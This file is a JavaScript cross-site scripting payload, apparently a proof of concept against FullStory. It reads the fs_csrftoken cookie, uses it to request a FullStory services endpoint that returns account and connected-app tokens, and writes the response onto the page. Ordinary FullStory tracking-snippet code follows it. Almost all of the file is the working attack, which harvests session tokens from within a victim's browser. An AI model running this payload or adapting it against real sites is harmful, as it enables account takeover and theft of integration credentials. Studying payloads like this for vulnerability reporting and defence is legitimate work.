alert(document.domain);

function getCsrfToken() {
      var cookies = document['cookie'].split(';');
      for (var i = 0; i < cookies.length; i++) {
        var part = cookies[i].trim();
        if (part.indexOf('fs_csrftoken') == 0) {
          return part.substring('fs_csrftoken='.length, part.length);
        }
      }
      return null;
    }



var xhr = new XMLHttpRequest();

xhr.open("GET", "https://app.fullstory.com/souq/services", true);

var csrfToken = getCsrfToken();
if (csrfToken) {
    xhr.setRequestHeader("Csrftoken", csrfToken);
}
alert('your CSRF token: '+csrfToken);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      document.write('<h1>All your tokens to access your account and all your connected apps token</h1><br>'+xhr.response);
    }
  }

xhr.send();



window['_fs_debug'] = false;
window['_fs_host'] = 'fullstory.com';
window['_fs_org'] = 'KTB5K';
window['_fs_namespace'] = 'FS';
(function(m,n,e,t,l,o,g,y){
    if (e in m) {if(m.console && m.console.log) { m.console.log('FullStory namespace conflict. Please set window["_fs_namespace"].');} return;}
    g=m[e]=function(a,b,s){g.q?g.q.push([a,b,s]):g._api(a,b,s);};g.q=[];
    o=n.createElement(t);o.async=1;o.crossOrigin='anonymous';o.src='https://'+_fs_host+'/s/fs.js';
    y=n.getElementsByTagName(t)[0];y.parentNode.insertBefore(o,y);
    g.identify=function(i,v,s){g(l,{uid:i},s);if(v)g(l,v,s)};g.setUserVars=function(v,s){g(l,v,s)};g.event=function(i,v,s){g('event',{n:i,p:v},s)};
    g.shutdown=function(){g("rec",!1)};g.restart=function(){g("rec",!0)};
    g.consent=function(a){g("consent",!arguments.length||a)};
    g.identifyAccount=function(i,v){o='account';v=v||{};v.acctId=i;g(o,v)};
    g.clearUserCookie=function(){};
})(window,document,window['_fs_namespace'],'script','user');
